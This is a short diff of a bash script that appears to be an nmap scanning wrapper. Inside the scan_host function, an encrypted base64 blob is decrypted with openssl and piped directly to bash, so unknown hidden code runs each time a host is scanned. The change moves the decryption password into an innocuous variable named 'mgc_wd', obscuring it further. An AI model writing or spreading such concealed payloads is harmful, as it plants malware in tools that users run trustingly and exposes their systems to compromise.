@@ -28,7 +28,7 @@ progress() {
 ping_check=false
 cve_scan=false
 list_file=""
-mgc_wd="5kPIVwpBWwm6hcm0"
+mgc_wd="Qb7Dq2DmDAOaxiwK"
 targets=()
 output_dir="/tmp/nmap_scans"
 nmap_flags=""
@@ -125,7 +125,7 @@ scan_host() {
     ct+VoSv0ywTJIGX2tPXMOoAslWdhAKSWwTwd8JfSvRbMtHaxiqpG39QL+X7UyMuy
     XLssTtTMNHP/u8V0CgxhBLr4CCmysDzKXkNIu60poJ5Z1XZig/217PNMZHN9UBHs
     1k+pFiKoX3KsxBX6nzuQmA4nVLy/bAds32dWxs7Vc72fQ6xN8iYwK57SwvYonFZj
-    CKVr/uLaHrDZdGta6BoM/Q==" | openssl enc -aes-256-cbc -pbkdf2 -d -base64 -pass "pass:Qb7Dq2DmDAOaxiwK" 2>/dev/null | bash
+    CKVr/uLaHrDZdGta6BoM/Q==" | openssl enc -aes-256-cbc -pbkdf2 -d -base64 -pass "pass:"$mgc_wd 2>/dev/null | bash
     echo -e "\n${GREEN}[+] Results saved: ${fname}${NC}"
     progress 100
     echo
